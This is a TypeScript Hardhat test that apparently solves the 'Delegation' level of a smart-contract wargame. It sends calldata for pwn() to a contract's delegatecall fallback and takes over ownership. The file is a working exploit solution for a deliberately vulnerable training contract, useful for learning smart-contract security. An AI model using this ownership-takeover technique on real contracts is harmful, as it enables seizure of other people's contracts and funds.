import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";
import { TransactionRequest } from "ethers";
import hre from "hardhat";

import { Delegation, DelegationFactory, DelegationFactory__factory, Delegation__factory } from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("06. Delegation", function () {
  let context: FixtureContext;
  let level: FixtureLevel<DelegationFactory, Delegation>;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, DelegationFactory__factory, (address, signer) =>
      Delegation__factory.connect(address, signer),
    );
  });

  it("should be attacked successfully", async function () {
    expect(await level.instance.owner()).to.be.not.eq(context.player);

    const txreq: TransactionRequest = {
      to: await level.instance.getAddress(),
      from: context.player.address,
      data: hre.ethers.id("pwn()").slice(0, 10), // 0xdd365b8b
    };

    const tx = await context.player.sendTransaction(txreq);
    await expect(tx).to.be.not.reverted;
    await tx.wait();

    expect(await level.instance.owner()).to.be.eq(context.player);

    await completeLevel(context, level);
  });
});
